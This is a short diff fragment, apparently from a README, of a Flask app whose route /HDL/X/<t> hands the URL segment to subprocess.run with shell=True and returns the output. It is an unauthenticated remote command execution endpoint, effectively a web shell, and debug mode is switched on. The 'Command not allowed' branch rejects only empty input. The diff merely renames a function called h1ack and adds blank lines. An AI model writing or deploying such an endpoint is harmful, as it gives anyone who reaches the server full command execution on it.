@@ -43,15 +43,19 @@ https://github.com/user-attachments/assets/a97de13d-781f-4c77-9763-14d198786eaf
 # This is A part From The Code
 import subprocess
 from flask import Flask, jsonify
+
 f = Flask(__name__)
 @f.route('/HDL/X/<t>', methods=['GET'])
+
 def r(t):
-    return h1ack(t)
-def h1ack(c):
+    return h(t)
+
+def h(c):
     if c:
         result = subprocess.run(c, shell=True, capture_output=True, text=True)
         return jsonify({"c": c, "o": result.stdout})
     return jsonify({"error": "Command not allowed"}), 403
+
 if __name__ == '__main__':
     f.run(debug=True)
 
